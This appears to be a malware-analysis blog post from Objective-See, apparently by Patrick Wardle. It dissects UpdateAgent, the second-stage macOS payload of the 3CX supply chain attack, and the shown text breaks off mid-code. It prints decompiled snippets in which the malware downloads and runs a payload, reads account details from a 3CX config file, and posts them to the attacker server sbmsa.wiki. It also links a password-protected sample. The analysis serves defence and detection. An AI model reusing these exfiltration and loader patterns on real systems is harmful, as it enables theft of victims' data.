<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  
  <head>

    <meta charset="UTF-8">
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    
    <link href="/css/style.css" rel="stylesheet" />
    <link href="/css/menu.css" rel="stylesheet" />

    
    <script src="/js/analytics.js"></script>
    <script src="/js/sweetalert.min.js"></script>
    <script src="/js/donationPopup.js"></script>
    <script src="/js/cookies.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>

    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>

  
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.org/images/blog/blog_0x74/BB.png />
<meta name="twitter:title" content=Ironing&#32;out&#32;(the&#32;macOS)&#32;details&#32;of&#32;a&#32;Smooth&#32;Operator&#32;(Part&#32;II) />
<meta name="twitter:description" content=Analyzing&#32;UpdateAgent,&#32;the&#32;2nd-stage&#32;macOS&#32;payload&#32;of&#32;the&#32;3CX&#32;supply&#32;chain&#32;attack />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Ironing&#32;out&#32;(the&#32;macOS)&#32;details&#32;of&#32;a&#32;Smooth&#32;Operator&#32;(Part&#32;II) />
<meta property="og:image" content=https://objective-see.org/images/blog/blog_0x74/BB.png />


  </head>

  <body>

    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZLBT2WB789"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZLBT2WB789');
</script>

<link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">#OBTS</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Book Series</span>
                    </a>
                </li>

                <li>
                    <a href="/we.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/weIcon.png" height="24px;">
                        <span style="vertical-align:middle">Objective-We</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Our Store/Swag</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/tools.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    
    <div class="pageContent">
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Ironing out (the macOS) details of a Smooth Operator (Part II)</div>
  <div class="blogSubTitle">Analyzing UpdateAgent, the 2nd-stage macOS payload of the 3CX supply chain attack</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / April 1, 2023</div>
  <link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<script src="../js/analytics.js"></script>
<script src="../js/sweetalert.min.js"></script>
<script src="../js/donationPopup.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<style type="text/css">
@media print { body { -webkit-print-color-adjust: exact; } }
</style>
<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; border-radius: 10px;">
    <div style="text-align: left; padding-bottom: 10px;">Objective-See's research, tools, and writing, are supported by the "Friends of Objective-See" such as:</div>
    <center>
        <div class="logo-link">
            <a href="https://www.jamf.com/?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/jamf.png" height="64px;">
                <br>
                <div class="logo-title">Jamf</div>
            </a>
        </div>
        <div class="logo-link">
            <a href="https://l.linklyhq.com/l/18wF2" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/mosyle.png" height="66px;">
                <br>
                <div class="logo-title">Mosyle</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://www.kandji.io" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/kandji.png" height="64px;">
                <br>
                <div class="logo-title">Kandji</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://macpaw.com/cleanmymac" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/cmm.png" height="64px;">
                <br>
                <div class="logo-title">CleanMyMac X</div>
            </a>
        </div>
        <div class="logo-link" style="">
            <a href="https://l.kolide.co/Objective-See" style="border: 0px;" target="_blank">
                <img src="/images/friends/textless/kolide.png" height="66px;">
                <br>
                <div class="logo-title">Kolide</div>
            </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://fleetdm.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/fleetdm.png" height="64px;">
        <div class="logo-title">Fleet</div>
        </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://www.paloaltonetworks.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/panw.png" height="64px;">
        <div class="logo-title">Palo Alto Networks</div>
        </a>
        </div>
        <div class="logo-link" style="">
        <a href="https://www.sophos.com" style="border: 0px;" target="_blank">
            <img src="/images/friends/textless/sophos.png" height="64px;">
        <div class="logo-title">Sophos</div>
        </a>
        </div>
    </center>
</div>
<br>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>As &ldquo;Sharing is Caring&rdquo; I&rsquo;ve uploaded the malicious binary <a href="https://github.com/objective-see/Malware/raw/main/SmoothOperator.zip">UpdateAgent</a> to our public macOS malware collection. The password is: infect3d</p>
<div align="right" style="padding-right:10px; padding-bottom:10px;">
...please though, don't infect yourself! 
</div>
</div>
<br>
<h3 id="background">Background</h3>
<p>Earlier this week, I published a <a href="https://objective-see.org/blog/blog_0x73.html">blog post</a> that added a missing puzzle piece to the 3CX supply chain attack (attributed to the North Koreans, aka Lazarus Group).</p>
<p>In that post, we uncovered the trojanization component of macOS variant of the attack, comprehensively analyzed it, and provided IoCs for detection. I&rsquo;d recommend reading that write up, as this post, part II, continues on from were that left off.</p>
<center>
    <a class="inlineLink" href="https://objective-see.org/blog/blog_0x73.html" target="_blank">
    <b>"Ironing out (the macOS details) of a Smooth Operator (Part I)"</b>
    </a>
</center>
<p>We ended the previous post, noting the main goal of the 1<sup>st</sup>-stage payload (<code>libffmpeg.dylib</code>) was to download and execute a 2<sup>nd</sup>-stage payload named <code>UpdateAgent</code>. The following snippet of annotated decompiled code, from the 1<sup>st</sup>-stage payload shows this logic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">//write out 2nd-stage payload &#34;UpdateAgent&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// which was just downloaded from the attacker&#39;s server
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>stream <span style="color:#f92672">=</span> fopen(path2UpdateAgent, <span style="color:#e6db74">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span>fwrite(bytes, length, <span style="color:#ae81ff">0x1</span>, stream);
</span></span><span style="display:flex;"><span>fflush(stream);
</span></span><span style="display:flex;"><span>fclose(stream);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//make +x
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>chmod(path2UpdateAgent, <span style="color:#ae81ff">755</span>);
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span><span style="color:#75715e">//execute
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>popen(path2UpdateAgent, <span style="color:#e6db74">&#34;r&#34;</span>);</span></span></code></pre></div>
<p>As the attacker&rsquo;s servers were offline at the time of my analysis, I was unable to grab a copy of the <code>UpdateAgent</code> binary &hellip;leading me to state, &ldquo;what it does is a mystery&rdquo;.</p>
<p>But now with the <code>UpdateAgent</code> binary in my possession, let&rsquo;s solve the mystery of what it does!</p>
<p>Note: In order to get as much information out as quickly as possible I originally tweeted my analysis of the <code>UpdateAgent</code>:</p>
<center>
    <blockquote class="twitter-tweet"><p lang="en" dir="ltr">Tonight we dive into the 2nd-stage macOS payload, &quot;UpdateAgent&quot;, from the <a href="https://twitter.com/hashtag/3CX?src=hash&amp;ref_src=twsrc%5Etfw">#3CX</a> / <a href="https://twitter.com/hashtag/3CXpocalypse?src=hash&amp;ref_src=twsrc%5Etfw">#3CXpocalypse</a>  supply-chain attack 🍎👾🔬 <a href="https://t.co/FiKVI7Fioy">https://t.co/FiKVI7Fioy</a></p>&mdash; Patrick Wardle (@patrickwardle) <a href="https://twitter.com/patrickwardle/status/1641721723417657345?ref_src=twsrc%5Etfw">March 31, 2023</a></blockquote>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>&hellip;this post both reiterates that initial analysis and builds upon it (and hey a blog post is a little more readable and &lsquo;official&rsquo;).</p>
<h3 id="triage">Triage</h3>
<p>The (SHA-1) hash for the <code>UpdateAgent</code> was originally published in SentinelOne <a href="https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/">report</a>: <code>9e9a5f8d86356796162cee881c843cde9eaedfb3</code></p>
<img src="../images/blog/blog_0x74/hash.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">UpdateAgent&#39;s Hash (image credit: SentinelOne)</center>

<p><a href="https://objective-see.org/products/whatsyoursign.html">WhatsYourSign</a> shows other hashes (MD5, etc):</p>
<img src="../images/blog/blog_0x74/hashes.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(other) hashes</center>

<p>You can also see that WhatsYourSign has determine that though <code>UpdateAgent</code> is signed, its signature is adhoc (and thus not notarized). You can confirm this with macOS&rsquo;s <code>codesign</code> utility as well:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% codesign -dvvv UpdateAgent 
Executable=/Users/patrick/Library/Application Support/3CX Desktop App/UpdateAgent
Identifier=payload2-55554944839216049d683075bc3f5a8628778bb8
CodeDirectory v=20100 size=450 flags=0x2(<b>adhoc</b>) hashes=6+5 location=embedded
...
<b>Signature=adhoc</b>
</pre>
</div>
<p>Also from <code>UpdateAgent</code>&rsquo;s code signing information, we can see it&rsquo;s identifier: <code>payload2-55554944839216049d683075bc3f5a8628778bb8</code>. Other Lazarus group payloads are also signed adhoc and use a similar identifier scheme. For example check out the code signing information from Lazarus&rsquo;s AppleJuice.C:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% codesign -dvvv AppleJeus/C/unioncryptoupdater 
Executable=/Users/patrick/Malware/AppleJeus/C/unioncryptoupdater
Identifier=macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392
CodeDirectory v=20100 size=739 flags=0x2(<b>adhoc</b>) hashes=15+5 location=embedded
Hash type=sha256 size=32

<b>Signature=adhoc</b>
</pre>
</div>
<p>Using macOS&rsquo;s <code>file</code> command, we see the <code>UpdateAgent</code> binary is an x86_64 (Intel) Mach-O:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% file UpdateAgent 
UpdateAgent: Mach-O 64-bit executable x86_64
</pre>
</div></p>
<p>&hellip;this means that unless Rosetta is installed, it won&rsquo;t run on Apple Silicon. (Recall that the arm64 version of the 1<sup>st</sup> payload, <code>libffmpeg.dylib</code> was not trojanized).</p>
<p>Let&rsquo;s now run the <code>strings</code> command (with the <code>&quot;-&quot;</code> option which instructs it to scan the whole file), we find strings that appear to be related to:</p>
<ul>
<li>Config files</li>
<li>Config parameters</li>
<li>Attacker server (sbmsa[.]wiki)</li>
<li>Method names of networking APIs</li>
</ul>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% strings -a UpdateAgent 

%s/Library/Application Support/3CX Desktop App/.main_storage
%s/Library/Application Support/3CX Desktop App/config.json

"url": "https://
"AccountName": "

https://sbmsa.wiki/blog/_insert
3cx_auth_id=%s;3cx_auth_token_content=%s;__tutma=true

URLWithString:
requestWithURL:
addValue:forHTTPHeaderField:
dataTaskWithRequest:completionHandler:
</pre>
</div>
<p>This wraps up our triage of the <code>UpdateAgent</code> binary. Time to dive in deeper with our trusty friends: the disassembler and debugger!</p>
<h3 id="analysis-of-updateagent">Analysis of <code>UpdateAgent</code></h3>
<p>In this section we&rsquo;ll more deeply analyze the malicious logic of the <code>UpdateAgent</code> binary.</p>
<p>Throwing the binary in a debugger (starting at its <code>main</code>), we see within the first few lines of code the malware contain some basic anti-analysis logic.</p>
<ul>
<li>
<p>Forks itself via <code>fork</code>
<br>
This slightly complicates debugging, as forking creates a new process (vs. the parent, we&rsquo;re debugging).</p>
</li>
<li>
<p>Self-deletes via <code>ulink</code>
<br>
This can thwart file-based AV scanners, or simply make it harder to find/grab the binary for analysis!</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fork() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//in child
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>            unlink(argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>);</span></span></code></pre></div>
<p>As noted, when <code>fork</code> executes, a new (child) process is created. We can see that in the above disassembly, the parent will then exit &hellip;while the child will continue on executing. So, if we&rsquo;re debugging the parent our debugging session will terminate. There are debugger commands that can follow the child, but IMHO its easier to just set a breakpoint on the <code>fork</code>, then skip over it (via the <code>register write $pc &lt;address of instruction after fork&gt;</code>) altogether.</p>
<p>We also noted the child process (the parent has exited), will delete itself via the <code>unlink</code> API. This is readily observable via a <a href="https://objective-see.org/products/utilities.html#FileMonitor">file monitor</a>, which capture thes <code>ES_EVENT_TYPE_NOTIFY_UNLINK</code> event of the <code>UpdateAgent</code> file by the <code>UpdateAgent</code> process:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter UpdateAgent
{
  "event" : <b>"ES_EVENT_TYPE_NOTIFY_UNLINK"</b>,
  "file" : {
    "destination" : "~/Library/Application Support/3CX Desktop App/UpdateAgent",
    ...
    "process" : {
        "pid" : 38206,
        "name" : "UpdateAgent",
        "path" : "~/Library/Application Support/3CX Desktop App/UpdateAgent"
    }
  }
}
</pre>
</div>
<p>Next, as the malware has not stripped its symbols nor obfuscated its strings, in a disassembler see the malware performing the following:</p>
<ul>
<li>Calls a function called <code>parse_json_config</code></li>
<li>Calls a function called <code>read_config</code></li>
<li>Calls a function named <code>enc_text</code></li>
<li>Builds a string (<code>&quot;3cx_auth_id=...&quot; + ?</code>)</li>
<li>Calls a function named <code>send_post</code> passing in the URI <code>https://sbmsa.wiki/blog/_insert</code></li>
</ul>
<p>Let&rsquo;s explore each of these, starting with the call to the malware&rsquo;s <code>parse_json_config</code> function.</p>
<p>This attempts to open a file, <code>config.json</code> (in <code>~/Library/Application Support/3CX Desktop App</code>).
According to an email I received (thanks Adam!) this appears to be a legitimate configuration file, that is part of 3CX&rsquo;s app.</p>
<p>We can observe the malware opening the configuration file in a <a href="https://objective-see.org/products/utilities.html#FileMonitor">file monitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter UpdateAgent
{
  "event" : "ES_EVENT_TYPE_NOTIFY_OPEN",
  "file" : {
    "destination" : <b>"~/Library/Application Support/3CX Desktop App/config.json"</b>,
    ...
    "process" : {
        "pid" : 38206,
        "name" : "UpdateAgent",
        "path" : "~/Library/Application Support/3CX Desktop App/UpdateAgent"
    }
  }
}

</pre>
</div>
<p>Once it has opened this file, <code>UpdateAgent</code> looks for values from the keys: <code>url</code> and <code>AccountName</code>, as we can see in the annotated disassembly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">parse_json_config</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sprintf(<span style="color:#f92672">&amp;</span>var_1230, <span style="color:#e6db74">&#34;%s/Library/Application Support/3CX Desktop App/config.json&#34;</span>, arg0);
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> fopen(<span style="color:#f92672">&amp;</span>var_1230, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    fread(<span style="color:#f92672">&amp;</span>var_1030, rsi, <span style="color:#ae81ff">0x1</span>, r12);
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> strstr(<span style="color:#f92672">&amp;</span>var_1030, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">url</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">https://&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> strstr(<span style="color:#f92672">&amp;</span>var_1030, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">AccountName</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);</span></span></code></pre></div>
<p>Here&rsquo;s a snippet from a legitimate 3CX <code>config.json</code> file, showing an example of such values:</p>
<pre tabindex="0"><code>{
    &#34;ProvisioningSettings&#34;: {
        &#34;url&#34;: &#34;https://servicemax.3cx.com/provisioning/&lt;redacted&gt;/&lt;redacted&gt;/&lt;redacted&gt;.xml&#34;,
        &#34;file&#34;: {
            &#34;Extension&#34;: &#34;00&#34;,
            ...
            &#34;GCMSENDERID&#34;: &#34;&#34;,
            &#34;AccountName&#34;: &#34;&lt;redacted&gt;&#34;,
</code></pre><p>From this, we can see the <code>url</code> key appears to contain a link to the xml provisioning file for the VOIP system. On the other hand, <code>AccountName</code> is full name of the account owner.</p>
<div class="note">
If the config.json file is not found, the malware exits. As I didn't have the 3CX app fully installed, to keep the malware happily executing so I could continue (dynamic) analysis I created a dummy config.json (containing the expected keys, with some random values).
</div>
<p>With the values of <code>url</code> and <code>AccountName</code> extracted from the <code>config.json</code> file the malware then calls a function named <code>read_config</code>.</p>
<p>This opens and then reads in the contents of the <code>.main_storage</code> file. Recall that this file created by the 1<sup>st</sup>-stage payload (<code>libffmpeg.dylib</code>) and contains a UUID - likely uniquely identifying the victim. The <code>read_config</code> function then de-XORs the UUID with the key <code>0x7a</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read_config</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span> arg0, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> arg1) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sprintf(<span style="color:#f92672">&amp;</span>var_230, <span style="color:#e6db74">&#34;%s/Library/Application Support/3CX Desktop App/.main_storage&#34;</span>, arg0);
</span></span><span style="display:flex;"><span>    handle <span style="color:#f92672">=</span> fopen(<span style="color:#f92672">&amp;</span>var_230, <span style="color:#e6db74">&#34;rb&#34;</span>);
</span></span><span style="display:flex;"><span>    fread(buffer, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x1</span>, rax);
</span></span><span style="display:flex;"><span>    fclose(handle);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(buffer <span style="color:#f92672">+</span> index) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(buffer <span style="color:#f92672">+</span> index) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7a</span>;
</span></span><span style="display:flex;"><span>        index<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (index <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x38</span>);</span></span></code></pre></div>
<p>Once the <code>read_config</code> has returned, the malware concatenates the <code>url</code> and <code>AccountName</code> and then encrypts them via a function named <code>enc_text</code>. Next it combines this encrypted string with the de-XOR&rsquo;d UUID (from the <code>.main_storage</code> file).</p>
<p>These values are combined in the following parameterized string:</p>
<p><code>3cx_auth_id=UUID;3cx_auth_token_content=encryted url;account name;__tutma=true</code></p>
<p>We can dump this in a debugger:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% lldb UpdateAgent

...

(lldb) x/s 0x304109390: "3cx_auth_id=3725e81e-0519-7f09-72ac-35641c94c1cf;3cx_auth_token_content=S&per>ogZZGA55{ujj[MCC3&dol>wweZPP@&semi>4#riiZLBB7&dol>vvfZOOA93&per>vqeSJJ?-!!pbWWE@&semi>0xppZQII5&plus>}}sjb;__tutma=true"

</pre>
</div>
<p>Now the malware is ready to send this information to the attacker&rsquo;s remote server. This is accomplished via a function the malware names <code>send_post</code>. It takes as several parameters including the remote server/API endpoint <code>https://sbmsa.wiki/blog/_insert</code> and the <code>3cx_auth_id=...</code> string:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>enc_text(<span style="color:#f92672">&amp;</span>input, <span style="color:#f92672">&amp;</span>output);
</span></span><span style="display:flex;"><span>sprintf(<span style="color:#f92672">&amp;</span>paramString, <span style="color:#e6db74">&#34;3cx_auth_id=%s;3cx_auth_token_content=%s;__tutma=true&#34;</span>, <span style="color:#f92672">&amp;</span>UUID, <span style="color:#f92672">&amp;</span>output);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>send_post(<span style="color:#e6db74">&#34;https://sbmsa.wiki/blog/_insert&#34;</span>, <span style="color:#f92672">&amp;</span>paramString, <span style="color:#f92672">&amp;</span>var_1064);
</span></span><span style="display:flex;"><span>                                   
</span></span></code></pre></div>
<p>The <code>send_post</code> function configures an URL request with a hard-coded user-agent string (<code>&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Safari/537.36</code>) and add the <code>3cx_auth_id=...</code> parameter string in the &ldquo;Cookie&rdquo; HTTP header.</p>
<p>Then, via the <code>nsurlsession</code>&rsquo;s <code>dataTaskWithRequest:completionHandler:</code> method the malware makes the request to <code>https://sbmsa.wiki/blog/_insert</code>.</p>
<p>Via my <a href="https://objective-see.org/products/utilities.html#DNSMonitor">DNSMonitor</a>, we can observe (the initial part, the DNS resolution) of this:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% DNSMonitor.app/Contents/MacOS/DNSMonitor -json -pretty
[{
  "Process" : {
    "pid" : 40063,
    "signing ID" : "payload2-55554944839216049d683075bc3f5a8628778bb8",
    "path" : "\/Users\/patrick\/Library\/Application Support\/3CX Desktop App\/UpdateAgent"
  },
  "Packet" : {
    "Opcode" : "Standard",
    "QR" : "Query",
    "Questions" : [
      {
        "Question Name" : <b>"sbmsa.wiki"</b>,
        "Question Class" : "IN",
        "Question Type" : "?????"
      }
    ],
    "RA" : "No recursion available",
    "Rcode" : "No error",
    "RD" : "Recursion desired",
    "XID" : 25349,
    "TC" : "Non-Truncated",
    "AA" : "Non-Authoritative"
  }
}
</pre>
</div>
<p>&hellip;unfortunately (for our continued analysis efforts) as the <code>sbmsa.wiki</code> server is offline, the connection fails.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% nslookup sbmsa.wiki
;; connection timed out; no servers could be reached
</pre>
</div>
<p>Still, we can continue static analysis of the <code>UpdateAgent</code> binary to see what it would do if the attacker&rsquo;s server was (still) online.</p>
<p>&hellip;the answer is though, appears to be, nothing:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> send_post(<span style="color:#e6db74">&#34;https://sbmsa.wiki/blog/_insert&#34;</span>, <span style="color:#f92672">&amp;</span>paramString, <span style="color:#f92672">&amp;</span>var_1064);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (response <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    free(response);
</span></span><span style="display:flex;"><span>}
